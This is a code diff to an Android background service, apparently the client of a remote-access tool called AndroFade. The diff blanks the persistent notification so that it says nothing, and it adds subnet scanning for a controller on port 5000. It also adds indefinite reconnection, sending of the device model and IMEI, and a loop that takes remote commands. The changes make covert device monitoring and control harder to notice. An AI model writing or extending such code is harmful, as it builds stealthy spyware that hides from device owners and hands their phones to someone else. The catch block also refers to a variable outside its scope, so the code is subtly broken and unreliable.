@@ -7,6 +7,8 @@ import android.os.IBinder;
 import androidx.core.app.NotificationCompat;
 import java.io.*;
 import java.net.Socket;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class Client extends Service {
     
@@ -14,10 +16,13 @@ public class Client extends Service {
     private Socket socket;
     private DataInputStream in;
     private DataOutputStream out;
-    private String serverIP = "192.168.1.100";
+    private String serverIP = "";
     private int serverPort = 5000;
     private boolean isConnected = false;
     private Thread connectionThread;
+    private Timer reconnectTimer;
+    private int reconnectAttempt = 0;
+    private final int[] retryIntervals = {5000, 10000, 15000, 30000}; // 5s, 10s, 15s, 30s
     
     private PermissionManager permissionManager;
     private GPSListener gpsListener;
@@ -27,13 +32,6 @@ public class Client extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null) {
-            serverIP = intent.getStringExtra("IP");
-            if (serverIP == null) serverIP = "192.168.1.100";
-            
-            serverPort = intent.getIntExtra("PORT", 5000);
-        }
-        
         // Initialize managers
         permissionManager = new PermissionManager(this);
         gpsListener = new GPSListener(this);
@@ -41,63 +39,160 @@ public class Client extends Service {
         connectionManager = new ConnectionManager(this);
         notificationManager = new NotificationManager(this);
         
-        // Start foreground service
+        // Start foreground service (silent)
         startForegroundService();
         
-        // Connect to server
-        connectionThread = new Thread(new Runnable() {
-            @Override
-            public void run() {
-                connectToServer();
-            }
-        });
-        connectionThread.start();
+        // Start auto-discovery and connection
+        startAutoDiscovery();
         
         return START_STICKY;
     }
 
     private void startForegroundService() {
+        // Silent notification (minimal)
         NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "AndroFade")
-                .setContentTitle("AndroFade")
-                .setContentText("Service running...")
+                .setContentTitle("")
+                .setContentText("")
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setPriority(NotificationCompat.PRIORITY_LOW);
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setOngoing(true)
+                .setShowWhen(false);
         
         startForeground(1, builder.build());
     }
 
-    private void connectToServer() {
-        try {
-            socket = new Socket(serverIP, serverPort);
-            in = new DataInputStream(socket.getInputStream());
-            out = new DataOutputStream(socket.getOutputStream());
-            isConnected = true;
-            
-            // Send device info
-            sendDeviceInfo();
-            
-            // Listen for commands
-            listenForCommands();
-        } catch (Exception e) {
-            android.util.Log.e(TAG, "Connection error: " + e.getMessage());
-            isConnected = false;
+    private void startAutoDiscovery() {
+        connectionThread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                autoDiscoverAndConnect();
+            }
+        });
+        connectionThread.setDaemon(true);
+        connectionThread.start();
+    }
+
+    private void autoDiscoverAndConnect() {
+        while (true) {
+            try {
+                // Get local network IP range
+                String localIP = getLocalIP();
+                if (localIP != null && !localIP.isEmpty()) {
+                    // Try to connect to server on local network
+                    if (attemptConnection(localIP)) {
+                        reconnectAttempt = 0; // Reset on successful connection
+                        listenForCommands();
+                    }
+                }
+                
+                // If connection fails, wait and retry
+                if (!isConnected) {
+                    long waitTime = getRetryInterval();
+                    Thread.sleep(waitTime);
+                    reconnectAttempt++;
+                }
+            } catch (Exception e) {
+                android.util.Log.e(TAG, "Auto-discovery error: " + e.getMessage());
+            }
         }
     }
 
-    private void sendDeviceInfo() throws IOException {
-        String deviceInfo = android.os.Build.DEVICE + "|" +
-                android.os.Build.MODEL + "|" +
-                android.os.Build.VERSION.RELEASE + "|" +
-                getDeviceIMEI();
+    private boolean attemptConnection(String baseIP) {
+        try {
+            // Extract base IP (e.g., 192.168.1 from 192.168.1.105)
+            String[] parts = baseIP.split("\\.");
+            if (parts.length < 3) return false;
+            
+            String base = parts[0] + "." + parts[1] + "." + parts[2];
+            
+            // Try common server IPs on local network
+            String[] serverCandidates = {
+                base + ".1",      // Router
+                base + ".100",    // Common server
+                base + ".101",
+                base + ".102",
+                base + ".254"     // Broadcast
+            };
+            
+            for (String ip : serverCandidates) {
+                try {
+                    Socket testSocket = new Socket(ip, serverPort);
+                    testSocket.setSoTimeout(3000);
+                    
+                    DataInputStream testIn = new DataInputStream(testSocket.getInputStream());
+                    DataOutputStream testOut = new DataOutputStream(testSocket.getOutputStream());
+                    
+                    // Test connection with INFO message
+                    String deviceInfo = android.os.Build.DEVICE + "|" +
+                            android.os.Build.MODEL + "|" +
+                            android.os.Build.VERSION.RELEASE + "|" +
+                            getDeviceIMEI();
+                    
+                    testOut.writeUTF("INFO:" + deviceInfo);
+                    testOut.flush();
+                    
+                    // If we get here, connection successful
+                    socket = testSocket;
+                    in = testIn;
+                    out = testOut;
+                    isConnected = true;
+                    serverIP = ip;
+                    return true;
+                } catch (Exception e) {
+                    // Connection failed, try next
+                    try {
+                        if (testSocket != null) testSocket.close();
+                    } catch (Exception ex) {
+                        // Ignore
+                    }
+                }
+            }
+        } catch (Exception e) {
+            android.util.Log.e(TAG, "Attempt connection error: " + e.getMessage());
+        }
         
-        out.writeUTF("INFO:" + deviceInfo);
-        out.flush();
+        isConnected = false;
+        return false;
+    }
+
+    private String getLocalIP() {
+        try {
+            java.net.Enumeration<java.net.NetworkInterface> interfaces = 
+                    java.net.NetworkInterface.getNetworkInterfaces();
+            
+            while (interfaces.hasMoreElements()) {
+                java.net.NetworkInterface iface = interfaces.nextElement();
+                java.net.Enumeration<java.net.InetAddress> addresses = iface.getInetAddresses();
+                
+                while (addresses.hasMoreElements()) {
+                    java.net.InetAddress addr = addresses.nextElement();
+                    if (!addr.isLoopbackAddress() && addr instanceof java.net.Inet4Address) {
+                        return addr.getHostAddress();
+                    }
+                }
+            }
+        } catch (Exception e) {
+            android.util.Log.e(TAG, "Get local IP error: " + e.getMessage());
+        }
+        return null;
+    }
+
+    private long getRetryInterval() {
+        if (reconnectAttempt >= retryIntervals.length) {
+            return retryIntervals[retryIntervals.length - 1];
+        }
+        return retryIntervals[reconnectAttempt];
     }
 
     private void listenForCommands() throws IOException {
         while (isConnected) {
-            String command = in.readUTF();
-            processCommand(command);
+            try {
+                String command = in.readUTF();
+                processCommand(command);
+            } catch (EOFException e) {
+                isConnected = false;
+                break;
+            }
         }
     }
 
